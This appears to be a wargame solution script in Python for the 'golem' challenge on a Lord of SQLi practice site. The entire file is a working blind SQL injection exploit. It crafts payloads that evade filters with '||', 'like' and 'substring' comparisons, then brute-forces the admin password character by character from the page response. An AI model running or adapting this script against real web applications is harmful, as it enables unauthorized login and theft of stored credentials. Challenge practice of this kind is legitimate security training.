import requests

#settings
pw=""
string1="/012345678@ABCDEFGHIJKLMNOPQRSTUVWXY" #for substring(pw) >
string2="123456789:BCDEFGHIJKLMNOPQRSTUVWXYZ[" #for substring(pw) <

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
session = dict(PHPSESSID="input_your_session_id!") #input your session id!


#starting Blind SQL Injection
for i in range(1, 9):
    for a in range(len(string1)):
        query=url+"'||id like 'admin'%26%26substring(pw,"+str(i)+",1)>'"+string1[a]+"'%26%26substring(pw,"+str(i)+",1)<'"+string2[a]
        req = requests.post(query, cookies=session)

        if "Hello admin" in req.text:
            pw += chr(ord(string1[a])+1)
            break

print("pw = " + pw)